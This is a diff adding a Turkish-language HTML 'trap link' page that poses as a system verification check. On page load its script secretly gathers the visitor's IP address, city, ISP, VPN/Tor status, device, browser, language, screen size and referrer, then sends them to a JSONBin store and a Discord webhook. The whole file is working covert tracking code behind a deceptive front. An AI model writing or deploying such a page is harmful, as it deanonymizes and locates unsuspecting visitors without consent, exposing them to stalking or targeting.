@@ -1,0 +1,193 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Sistem Doğrulama</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #0f172a;
+      color: #e2e8f0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      margin: 0;
+    }
+    .box {
+      max-width: 460px;
+      padding: 24px;
+      border-radius: 12px;
+      background: #1e293b;
+      border: 1px solid #334155;
+      text-align: center;
+    }
+    .muted {
+      color: #94a3b8;
+      font-size: 14px;
+      margin-top: 8px;
+    }
+  </style>
+</head>
+<body>
+  <div class="box">
+    <h3 id="title">Bağlantı Kontrol Ediliyor</h3>
+    <p class="muted" id="status">Lütfen bekleyin...</p>
+  </div>
+
+  <script src="config.js"></script>
+  <script>
+    async function loadContentJson() {
+      if (!TRAP_CONFIG.contentFile) return null;
+      try {
+        const res = await fetch(TRAP_CONFIG.contentFile, { cache: "no-store" });
+        if (!res.ok) return null;
+        return await res.json();
+      } catch {
+        return null;
+      }
+    }
+
+    function detectDevice() {
+      const ua = navigator.userAgent || "";
+      const platform = navigator.platform || "Bilinmiyor";
+      let os = "Bilinmiyor";
+
+      if (/iPhone|iPad|iPod/i.test(ua)) os = "iOS";
+      else if (/Android/i.test(ua)) os = "Android";
+      else if (/Windows/i.test(ua)) os = "Windows";
+      else if (/Mac/i.test(ua)) os = "macOS";
+      else if (/Linux/i.test(ua)) os = "Linux";
+
+      let browser = "Bilinmiyor";
+      if (/Edg\//i.test(ua)) browser = "Edge";
+      else if (/OPR|Opera/i.test(ua)) browser = "Opera";
+      else if (/Chrome/i.test(ua)) browser = "Chrome";
+      else if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) browser = "Safari";
+      else if (/Firefox/i.test(ua)) browser = "Firefox";
+
+      const isMobile = /Mobi|Android|iPhone|iPad|iPod/i.test(ua);
+      return `${isMobile ? "Mobil" : "Masaüstü"} / ${os} / ${browser} (${platform})`;
+    }
+
+    async function fetchIpAndGeo() {
+      const res = await fetch("https://ipwho.is/");
+      if (!res.ok) throw new Error("IP bilgisi alınamadı");
+      return await res.json();
+    }
+
+    async function updateJsonBin(entry) {
+      const url = `https://api.jsonbin.io/v3/b/${TRAP_CONFIG.jsonbinId}`;
+      const getRes = await fetch(`${url}/latest`, {
+        headers: {
+          "X-Master-Key": TRAP_CONFIG.jsonbinKey
+        }
+      });
+
+      let currentData = { logs: [] };
+      if (getRes.ok) {
+        const json = await getRes.json();
+        if (json && json.record) {
+          currentData = json.record;
+          if (!Array.isArray(currentData.logs)) {
+            currentData.logs = [];
+          }
+        }
+      }
+
+      currentData.last_updated = entry.timestamp;
+      currentData.logs.push(entry);
+
+      const putRes = await fetch(url, {
+        method: "PUT",
+        headers: {
+          "Content-Type": "application/json",
+          "X-Master-Key": TRAP_CONFIG.jsonbinKey
+        },
+        body: JSON.stringify(currentData)
+      });
+
+      return putRes.ok;
+    }
+
+    async function sendDiscordWebhook(entry) {
+      const content = [
+        "🚨 **Tuzak Link Erişimi Algılandı**",
+        `• **Cihaz:** ${entry.device}`,
+        `• **Saat:** ${entry.timestamp}`,
+        `• **IP:** \`${entry.ip}\``,
+        `• **IP Konumu / Adresi:** ${entry.location} (ASN/ISP: ${entry.isp})`,
+        `• **IP Durumu:** ${entry.ip_status}`,
+        `• **Dil:** ${entry.language} | **Ekran:** ${entry.screen}`,
+        `• **Referrer:** ${entry.referrer}`,
+        `• **User-Agent:** \`${entry.user_agent}\``
+      ].join("\n");
+
+      const res = await fetch(TRAP_CONFIG.discordWebhookUrl, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({ content })
+      });
+
+      return res.ok;
+    }
+
+    (async function runTrap() {
+      const titleEl = document.getElementById("title");
+      const statusEl = document.getElementById("status");
+      const contentCfg = await loadContentJson();
+
+      if (contentCfg?.title) titleEl.textContent = contentCfg.title;
+      if (contentCfg?.waiting_text) statusEl.textContent = contentCfg.waiting_text;
+
+      try {
+        const geo = await fetchIpAndGeo();
+        const sec = geo.security || {};
+        const conn = geo.connection || {};
+
+        const isVpnOrProxy = Boolean(
+          sec.vpn || sec.proxy || sec.tor || sec.hosting
+        );
+
+        const locationParts = [geo.city, geo.region, geo.country].filter(Boolean);
+        const locationText = locationParts.length ? locationParts.join(", ") : "Bilinmiyor";
+        const ispText = conn.isp || conn.org || conn.asn || "Bilinmiyor";
+
+        const entry = {
+          trap: TRAP_CONFIG.trapLabel,
+          timestamp: new Date().toISOString(),
+          ip: geo.ip || "Bilinmiyor",
+          location: locationText,
+          isp: ispText,
+          ip_status: isVpnOrProxy
+            ? "Muhtemel VPN / Proxy / Hosting"
+            : "Muhtemel Normal / ISP IP",
+          security_flags: {
+            vpn: Boolean(sec.vpn),
+            proxy: Boolean(sec.proxy),
+            tor: Boolean(sec.tor),
+            hosting: Boolean(sec.hosting)
+          },
+          device: detectDevice(),
+          language: navigator.language || "Bilinmiyor",
+          screen: `${window.screen.width}x${window.screen.height}`,
+          referrer: document.referrer || "Doğrudan / Yok",
+          user_agent: navigator.userAgent || "Bilinmiyor"
+        };
+
+        await Promise.all([
+          updateJsonBin(entry),
+          sendDiscordWebhook(entry)
+        ]);
+
+        statusEl.textContent = contentCfg?.done_text || "Doğrulama tamamlandı.";
+      } catch (err) {
+        statusEl.textContent = "Bağlantı sonlandırıldı.";
+      }
+    })();
+  </script>
+</body>
+</html>
